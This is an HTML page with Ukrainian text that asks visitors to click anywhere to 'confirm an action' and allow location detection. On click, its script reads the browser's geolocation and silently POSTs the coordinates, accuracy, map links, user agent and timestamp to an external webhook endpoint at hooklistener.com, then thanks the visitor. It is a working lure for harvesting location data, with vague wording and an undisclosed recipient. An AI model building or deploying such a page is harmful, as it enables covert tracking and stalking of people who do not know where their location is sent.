<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<title>Send location</title>

<style>
  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
  }

  body {
    background: linear-gradient(135deg, #4e54c8, #8f94fb);
    font-family: Arial, sans-serif;
    color: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
  }

  .box {
    background: rgba(0, 0, 0, 0.3);
    padding: 30px;
    border-radius: 12px;
    max-width: 420px;
  }

  h1 {
    margin-top: 0;
    font-size: 22px;
  }

  p {
    opacity: 0.9;
    font-size: 15px;
  }
</style>
</head>
<body>

<div class="box">
  <h1>Підтвердження дії</h1>
  <p>
    Натисніть будь-де на сторінці,<br>
    щоб дозволити визначення місця
  </p>
</div>

<script>
let sent = false;

function sendGeoOnce() {
  if (sent) return;
  sent = true;

  if (!navigator.geolocation) {
    alert("Геолокація не підтримується браузером");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      const googleMap = "https://www.google.com/maps?q=" + lat + "," + lon;
      const openStreetMap =
        "https://www.openstreetmap.org/?mlat=" + lat +
        "&mlon=" + lon +
        "#map=17/" + lat + "/" + lon;

      const payload = {
        latitude: lat,
        longitude: lon,
        accuracy: pos.coords.accuracy,
        google_map: googleMap,
        openstreet_map: openStreetMap,
        user_agent: navigator.userAgent,
        time: new Date().toISOString()
      };

      fetch("https://app.hooklistener.com/w/my-first-endpoint-ph72/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });

      document.querySelector(".box").innerHTML =
        "<h1>Дякуємо</h1><p>Локацію передано</p>";
    },
    (err) => {
      alert("Помилка геолокації: " + err.message);
    }
  );
}

document.addEventListener("click", sendGeoOnce);
</script>

</body>
</html>
